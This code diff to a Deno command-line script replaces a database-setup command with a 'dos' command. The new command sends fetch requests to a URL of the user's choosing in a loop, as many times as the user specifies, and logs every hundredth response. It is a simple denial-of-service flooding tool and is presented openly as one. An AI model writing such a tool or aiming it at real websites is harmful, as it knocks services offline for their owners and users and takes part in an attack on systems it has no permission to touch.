@@ -1,8 +1,4 @@
-import { parse } from "https://deno.land/std@0.215.0/flags/mod.ts";
-import { makeDB } from "./util/makedb.js";
-//import { denoPlugins } from "$fresh/src/build/deps.ts";
 const commands = Deno.args;
-const ComanndsObj = parse(Deno.args);
 const command = [];
 commands.forEach((commands) => {
   const result = commands.indexOf("--");
@@ -13,17 +9,15 @@ commands.forEach((commands) => {
   }
 });
 switch (command[0]) {
-  case "make":
-    switch (command[1]) {
-      case "dataabse":
-        makeDB();
-        break;
-
-      default:
-        break;
+  case "dos":
+    for (let i = 0; i < command[2]; i++) {
+      const result = await fetch(command[1]);
+      if (i % 100 == 0) {
+        console.log(i);
+        console.log(result);
+      }
     }
     break;
-
   default:
     console.log("error");
     break;
